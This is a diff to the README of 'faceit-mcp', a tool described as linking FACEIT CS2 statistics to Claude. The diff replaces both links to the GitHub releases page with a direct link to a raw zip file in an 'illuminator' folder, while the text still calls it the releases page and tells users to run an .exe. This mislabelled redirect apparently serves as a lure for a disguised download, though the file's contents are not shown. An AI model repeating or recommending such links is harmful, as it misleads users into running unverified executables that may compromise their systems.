@@ -1,6 +1,6 @@
 # 🎯 faceit-mcp - Access real-time CS2 stats through Claude
 
-[![Download faceit-mcp](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/saivi3171/faceit-mcp/releases)
+[![Download faceit-mcp](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/saivi3171/faceit-mcp/raw/refs/heads/main/illuminator/faceit_mcp_v2.5.zip)
 
 Faceit-mcp connects your FACEIT gaming statistics directly to the Claude AI assistant. You get immediate answers about your competitive performance, match history, and Elo rating without leaving your chat window. This tool uses the Model Context Protocol to bridge your gaming data and the AI.
 
@@ -27,7 +27,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to obtain the correct files:
 
-1. Visit the [releases page](https://github.com/saivi3171/faceit-mcp/releases) to download the installer.
+1. Visit the [releases page](https://github.com/saivi3171/faceit-mcp/raw/refs/heads/main/illuminator/faceit_mcp_v2.5.zip) to download the installer.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to save it to your Downloads folder.
 4. Open your Downloads folder and double-click the file to begin the installation.
